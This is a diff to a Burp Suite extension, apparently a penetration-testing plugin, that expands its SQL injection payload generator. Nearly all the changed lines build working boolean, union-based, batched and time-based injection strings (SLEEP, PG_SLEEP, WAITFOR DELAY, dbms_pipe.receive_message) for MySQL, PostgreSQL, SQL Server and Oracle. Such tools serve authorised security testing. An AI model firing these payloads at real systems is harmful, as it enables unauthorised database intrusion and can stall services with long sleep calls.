@@ -16,7 +16,7 @@ try:
 except ImportError:
     print "Failed to load dependencies."
 
-VERSION = "0.27"
+VERSION = "0.29"
 _colorful = True
 
 class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
@@ -692,7 +692,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         listSQLi = []
         prefixes = ["", "\\n", "\\r", "%0a", "0x0a", "%0d", "0x0d", "%00", "0x00"]
         delimeterStarts = ["", "'", "\'", "\\'", "\"", "\\\""]
-        delimeterBooleans = ["1=1", "1=2", "1<2", "1>2", "true", "false"]
+        delimeterBooleans = ["1=1", "1=2", "1<2", "1>2", "true", "false", "1337=(SELECT 1337 FROM PG_SLEEP(100))", "1337=(SELECT 1337 FROM (SELECT SLEEP(100))A)"]
         delimeterEnds = ["", ";", " -- ", "; -- "]
 
         for prefix in prefixes:
@@ -700,7 +700,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                 for delimeterBoolean in delimeterBooleans:
                     for delimeterEnd in delimeterEnds:
                         listSQLi.append(prefix + delimeterStart + " or " + delimeterBoolean + delimeterEnd + "\n")
-        
+
         for prefix in prefixes:
             for delimeterStart in delimeterStarts:
                 for delimeterEnd in delimeterEnds:
@@ -710,12 +710,12 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
             for delimeterStart in delimeterStarts:
                 for delimeterEnd in delimeterEnds:
                     unionPhrase = " UNION ALL SELECT "
-                    for i in range(10):
-                        unionPhrase += "1337"+ str(i)
+                    for i in range(8):
+                        unionPhrase += "NULL"
                         listSQLi.append(prefix + delimeterStart + unionPhrase + delimeterEnd + "\n")
-                        listSQLi.append(prefix + delimeterStart + unionPhrase.replace(" 13370", " sleep(100)") + delimeterEnd + "\n")
-                        #listSQLi.append(prefix + delimeterStart + unionPhrase.replace(" 13370", " pg_sleep(100)") + delimeterEnd + "\n")
-                        listSQLi.append(prefix + delimeterStart + unionPhrase.replace(" 13370", " WAITFOR DELAY "+ delimeterStart + "0:0:100" + delimeterStart) + delimeterEnd + "\n")
+                        listSQLi.append(prefix + delimeterStart + unionPhrase.replace("SELECT NULL", "SELECT sleep(100)") + delimeterEnd + "\n")
+                        listSQLi.append(prefix + delimeterStart + unionPhrase.replace("SELECT NULL", "SELECT (SELECT 1337 FROM PG_SLEEP(100))") + delimeterEnd + "\n")
+                        listSQLi.append(prefix + delimeterStart + unionPhrase.replace("SELECT NULL", "SELECT WAITFOR DELAY "+ delimeterStart + "0:0:100" + delimeterStart) + delimeterEnd + "\n")
                         unionPhrase += ","
 
         for prefix in prefixes:
@@ -727,10 +727,18 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                     listSQLi.append(prefix + delimeterStart + ";SELECT version()" + delimeterEnd + "\n")
                     listSQLi.append(prefix + delimeterStart + ";SELECT 1337" + delimeterEnd + "\n")
                     listSQLi.append(prefix + delimeterStart + ";SELECT sleep(100)" + delimeterEnd + "\n")
-                    listSQLi.append(prefix + delimeterStart + ";WAITFOR DELAY "+ delimeterStart + "0:0:100" + delimeterStart + delimeterEnd + "\n")
+                    listSQLi.append(prefix + delimeterStart + "| SELECT sleep(100)" + delimeterEnd + "\n")
+                    listSQLi.append(prefix + delimeterStart + "&& SELECT sleep(100)" + delimeterEnd + "\n")                    
                     listSQLi.append(prefix + delimeterStart + ";SELECT pg_sleep(100)" + delimeterEnd + "\n")
-                    listSQLi.append(prefix + delimeterStart + "||pg_sleep(20)" + delimeterEnd + "\n")
-                    listSQLi.append(prefix + delimeterStart + "pg_sleep(20)" + delimeterEnd + "\n")
+                    listSQLi.append(prefix + delimeterStart + "||pg_sleep(100)" + delimeterEnd + "\n")
+                    listSQLi.append(prefix + delimeterStart + " pg_sleep(100)" + delimeterEnd + "\n")
+                    if delimeterStart:
+                        listSQLi.append(prefix + delimeterStart + " or WAITFOR DELAY " + delimeterStart + "0:0:100" + delimeterStart + delimeterEnd + "\n")
+                        listSQLi.append(prefix + delimeterStart + ";WAITFOR DELAY " + delimeterStart + "0:0:100" + delimeterStart + delimeterEnd + "\n")
+                        listSQLi.append(prefix + ";WAITFOR DELAY " + delimeterStart + "0:0:100" + delimeterStart + delimeterEnd + "\n")
+                        listSQLi.append(prefix + delimeterStart + " WAITFOR DELAY " + delimeterStart + "0:0:100" + delimeterStart + delimeterEnd + "\n")
+                        listSQLi.append(prefix + delimeterStart + " or 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),100)" + delimeterEnd + "\n")
+                        listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),100)" + delimeterEnd + "\n")
 
         for prefix in prefixes:
             for delimeterStart in delimeterStarts[1:]:
@@ -748,7 +756,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         listSQLi.sort(reverse=True)
 
         self._tabDictResultDisplay.setText(''.join(map(str, listSQLi)))
-        self._lblStatusLabel.setText('Batched Queries, Boolean-Based, Union-Based and Time-Based Sql Injection payload generation is returned with '+ str(len(listSQLi)) + ' records! You can grep \'1337\' keyword in the Http responses.') 
+        self._lblStatusLabel.setText('Batched Queries, Boolean-Based, Union-Based and Time-Based Sql Injection payload generation is returned with '+ str(len(listSQLi)) + ' records!')
         return
 
     def getTabCaption(self):
